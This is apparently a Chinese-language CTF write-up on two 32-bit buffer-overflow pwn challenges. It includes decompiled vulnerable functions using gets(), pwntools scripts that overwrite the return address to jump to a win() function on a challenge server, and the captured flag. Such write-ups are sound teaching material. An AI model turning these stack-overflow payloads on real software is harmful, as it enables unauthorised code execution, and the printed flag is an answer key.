---
layout: post
title:  buffer-overflow 1/2
date:   2021-08-02 00:01:01 +0300
image:  2021-08-02-love.jpg
tags:   [ctf,Pwn]
---

### 1

main

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v4; // [esp+Ch] [ebp-Ch]

  setvbuf(_bss_start, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

getegid

```assembly
// attributes: thunk
__gid_t getegid(void)
{
  return getegid();
}
```

**C语言getgid()函数：取得组识别码函数**

头文件：

```assembly
#include <unistd.h>
#include <sys/types.h>
```

定义函数：

```assembly
gid_t getgid(void);
```

函数说明：getgid()用来取得执行目前进程的组识别码。

返回值：返回组识别码

范例

```assembly
#include <unistd.h>
#include <sys/types.h>
main()
{
  printf("egid is %d\n", getegid());
}
```

执行：

```assembly
gid is 0 //当使用root 身份执行范例程序时
```

**C语言getegid()函数：获得组识别码**

头文件：

```assembly
 #include <unistd.h>
 #include <sys/types.h>
```

定义函数：

```assembly
gid_t getegid(void);
```

函数说明：getegid()用来取得执行目前进程有效组识别码. 有效的组识别码用来决定进程执行时组的权限.

返回值：返回有效的组识别码.

范例

```assembly
#include <unistd.h>
#include <sys/types.h>
main()
{
  printf("egid is %d\n", getegid());
}
```

执行：

```assembly
egid is 0 //当使用root 身份执行范例程序时
```

setresgid()

```assembly
// attributes: thunk
int __cdecl setresgid(int a1, int a2, int a3)
{
  return setresgid(a1, a2, a3);
}
```

**setresgid()**设置调用的真实GID，有效GID和保存的set-group-ID, 如果对应参数设置为-1, 则对应的ID不改变

vuln

```assembly
int vuln()
{
  int v0; // eax
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  gets(s);
  v0 = get_return_address();
  return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", v0);
}
```

get_return_address

```assembly
int __usercall get_return_address@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}
```

```assembly
.text:080486C0                 public get_return_address
.text:080486C0 get_return_address proc near            ; CODE XREF: vuln+15↑p
.text:080486C0                 mov     eax, [ebp+4]
.text:080486C3                 retn
.text:080486C3 get_return_address endp
```

win

```assembly
int win()
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 0x40, stream);
  return printf(s);
}
```

前面的两个函数貌似没用，直接打

```assembly
from pwn import *

io = remote("node4.buuoj.cn", 27436)

win = 0x80485CB
payload = "a" * 40 + p32(0) + p32(win)
io.sendline(payload)

io.interactive()
```

### 2

main

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v4; // [esp+Ch] [ebp-Ch]

  setvbuf(_bss_start, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

vuln

```assembly
int vuln()
{
  char s[108]; // [esp+Ch] [ebp-6Ch] BYREF

  gets(s);
  return puts(s);
}
```

win

```assembly
char *__cdecl win(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  result = fgets(s, 0x40, stream);
  if ( a1 == 0xDEADBEEF && a2 == 0xDEADC0DE )
    result = (char *)printf(s);
  return result;
}
```

vuln函数中存在栈溢出，使其溢出跳转到win函数，并传入两个参数0xDEADBEEF和0xDEADC0DE

```assembly
from pwn import *

io = remote("node4.buuoj.cn", 26439)

win = 0x80485cb
payload = "a"*(108+4) + p32(win) + p32(0) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
io.sendline(payload)

io.interactive()
```

flag{92f291a4-1563-4709-811a-a498b4c4f890}

